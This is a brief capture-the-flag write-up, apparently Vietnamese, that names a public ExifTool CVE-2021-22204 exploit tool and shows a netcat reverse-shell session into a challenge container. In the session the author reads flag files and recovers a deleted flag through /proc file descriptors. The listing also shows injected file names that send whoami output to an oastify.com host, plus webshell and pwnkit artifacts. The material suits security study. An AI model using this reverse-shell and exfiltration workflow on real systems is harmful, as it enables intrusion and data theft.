Dùng tool này: [convisolabs/CVE-2021-22204-exiftool](https://github.com/convisolabs/CVE-2021-22204-exiftool/tree/master)

```bash
zenniskayy@ZennisKayy:~$ nc -nvlp 9090
Listening on 0.0.0.0 9090
Connection received on 127.0.0.1 45518
/bin/sh: 0: can't access tty; job control turned off
# ls
18.jpg
20251120_171834_noexif.jpg
57990e7c0e2163457522b1d840342.webp
GCONV_PATH=.
IMG_0003.jpg
IMG_0103.jpg
MANIFEST.MF
SAMIR
Screenshot 2025-11-23 045817.png
Untitled.jpeg
Untitled.png
a.jpeg
ad.php
adminer.php
attack1.jpg
b-311.jpg
better.png
crab.jpg_Mode.png
dog-relax.png
drop.jpg
exif_test.jpg
exploit.jpg
exploit_env.jpg
exploit_find_flag.jpg
exploit_flag.jpg
exploit_flag_txt.jpg
exploit_home_flag.jpg
exploit_ls_root.jpg
exploit_multi_flag.jpg
exploit_root_flag.jpg
exploit_webshell.jpg
exploit_whoami.jpg
exploit_www_flag.jpg
final_exploit.jpg
final_flag.jpg
flag.jpg
flag_exploit.jpg
found.txt
game.jpg
gecko-new.php
gecko.php
gn71o5ax9hdd3cqkmyw40qqj9af13tri.oastify.com?flag=$(whoami)
gn71o5ax9hdd3cqkmyw40qqj9af13tri.oastify.com?flag=$(whoami|base64) #
image.jpg
image.php
image2.jpg
image_0.jpg
image_1.jpg
image_10.jpg
image_11.jpg
image_2.jpg
image_3.jpg
image_4.jpg
image_5.jpg
image_6.jpg
image_7.jpg
image_8.jpg
image_9.jpg
kkk.php
mad-root
malicious.jpg
notfound.php
ok.jpg
oreo.jpg
output.png
payload.jpg
payload.png
payload_full.jpg
payload_full.png
plz-dont-delete.php
prueva.jpeg
pwnkit
rev.php
sugar-map.txt
test.jpg
test.php
test.txt
test2.txt
test_ahapvwlx.jpg
test_jxecdvhg.jpg
two.png
win.png
wtf.php
wtf2.php
# ls -la /
total 84
drwxr-xr-x   1 root root  4096 Nov 23 01:01 .
drwxr-xr-x   1 root root  4096 Nov 23 01:01 ..
-rwxr-xr-x   1 root root     0 Nov 23 01:01 .dockerenv
lrwxrwxrwx   1 root root     7 Apr  4  2025 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Apr 15  2020 boot
drwxr-xr-x   5 root root   340 Nov 23 01:01 dev
-rwxr-xr-x   1 root root   303 Nov 23 00:36 entrypoint.sh
drwxr-xr-x   1 root root  4096 Nov 23 01:01 etc
drwxr-xr-x   1 root root  4096 Nov 23 00:59 flags
drwxr-xr-x   2 root root  4096 Apr 15  2020 home
lrwxrwxrwx   1 root root     7 Apr  4  2025 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr  4  2025 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr  4  2025 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr  4  2025 libx32 -> usr/libx32
drwxr-xr-x   2 root root  4096 Apr  4  2025 media
drwxr-xr-x   2 root root  4096 Apr  4  2025 mnt
drwxr-xr-x   1 root root  4096 Nov 23 00:59 opt
dr-xr-xr-x 468 root root     0 Nov 23 01:01 proc
drwx------   1 root root  4096 Nov 23 00:59 root
drwxr-xr-x   1 root root  4096 Nov 23 01:01 run
lrwxrwxrwx   1 root root     8 Apr  4  2025 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Apr  4  2025 srv
dr-xr-xr-x  13 root root     0 Nov 21 23:20 sys
drwxrwxrwt   1 root root 12288 Nov 23 01:18 tmp
drwxr-xr-x   1 root root  4096 Apr  4  2025 usr
drwxr-xr-x   1 root root  4096 Nov 23 00:58 var
# cat flags
cat: flags: No such file or directory
# cd flags
/bin/sh: 4: cd: can't cd to flags
# cat /flags
cat: /flags: Is a directory
# cd /flags
# ls -la /
total 84
drwxr-xr-x   1 root root  4096 Nov 23 01:01 .
drwxr-xr-x   1 root root  4096 Nov 23 01:01 ..
-rwxr-xr-x   1 root root     0 Nov 23 01:01 .dockerenv
lrwxrwxrwx   1 root root     7 Apr  4  2025 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Apr 15  2020 boot
drwxr-xr-x   5 root root   340 Nov 23 01:01 dev
-rwxr-xr-x   1 root root   303 Nov 23 00:36 entrypoint.sh
drwxr-xr-x   1 root root  4096 Nov 23 01:01 etc
drwxr-xr-x   1 root root  4096 Nov 23 00:59 flags
drwxr-xr-x   2 root root  4096 Apr 15  2020 home
lrwxrwxrwx   1 root root     7 Apr  4  2025 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr  4  2025 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr  4  2025 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr  4  2025 libx32 -> usr/libx32
drwxr-xr-x   2 root root  4096 Apr  4  2025 media
drwxr-xr-x   2 root root  4096 Apr  4  2025 mnt
drwxr-xr-x   1 root root  4096 Nov 23 00:59 opt
dr-xr-xr-x 465 root root     0 Nov 23 01:01 proc
drwx------   1 root root  4096 Nov 23 00:59 root
drwxr-xr-x   1 root root  4096 Nov 23 01:01 run
lrwxrwxrwx   1 root root     8 Apr  4  2025 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Apr  4  2025 srv
dr-xr-xr-x  13 root root     0 Nov 21 23:20 sys
drwxrwxrwt   1 root root 12288 Nov 23 01:19 tmp
drwxr-xr-x   1 root root  4096 Apr  4  2025 usr
drwxr-xr-x   1 root root  4096 Nov 23 00:58 var
# ls -la /flags
total 12
drwxr-xr-x 1 root root 4096 Nov 23 00:59 .
drwxr-xr-x 1 root root 4096 Nov 23 01:01 ..
-rw-r--r-- 1 root root   30 Nov 22 16:52 root.txt
# cat /flags/root.txt
cat: '/flags/r'$'\303''oot.txt': No such file or directory
# cat /flags/*
MASONCC{images_give_us_bash?}
# ls -la /proc/*/fd/* 2>/dev/null | grep deleted
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/134337/fd/5 -> /tmp/#5524584 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/134338/fd/10 -> /tmp/#5524584 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/134338/fd/11 -> /tmp/#5524584 (deleted)
l-wx------ 1 root     root     64 Nov 23 01:16 /proc/14/fd/3 -> /tmp/flag.txt (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/152259/fd/5 -> /tmp/#5524749 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/152260/fd/10 -> /tmp/#5524749 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/152260/fd/11 -> /tmp/#5524749 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/169838/fd/5 -> /tmp/#5524764 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/169840/fd/10 -> /tmp/#5524764 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/169840/fd/11 -> /tmp/#5524764 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/187410/fd/5 -> /tmp/#5524773 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/187411/fd/10 -> /tmp/#5524773 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/187411/fd/11 -> /tmp/#5524773 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/204984/fd/5 -> /tmp/#5524769 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/204985/fd/10 -> /tmp/#5524769 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/204985/fd/11 -> /tmp/#5524769 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/212416/fd/5 -> /tmp/#5524819 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/212417/fd/10 -> /tmp/#5524819 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/212417/fd/11 -> /tmp/#5524819 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/215946/fd/5 -> /tmp/#5524647 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/215947/fd/10 -> /tmp/#5524647 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:25 /proc/215947/fd/11 -> /tmp/#5524647 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/249/fd/5 -> /tmp/#5524339 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/250/fd/10 -> /tmp/#5524339 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/250/fd/11 -> /tmp/#5524339 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/26/fd/9 -> /tmp/.ZendSem.IGrLB9 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/388/fd/5 -> /tmp/#5524173 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/389/fd/10 -> /tmp/#5524173 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/389/fd/11 -> /tmp/#5524173 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/4374/fd/5 -> /tmp/#5524444 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/4377/fd/10 -> /tmp/#5524444 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/4377/fd/11 -> /tmp/#5524444 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/61685/fd/5 -> /tmp/#5524468 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/61686/fd/10 -> /tmp/#5524468 (deleted)
lrwx------ 1 root     root     64 Nov 23 01:16 /proc/61686/fd/11 -> /tmp/#5524468 (deleted)
# cat /proc/14/fd/3
PCTF{hidden_in_depths}
#
```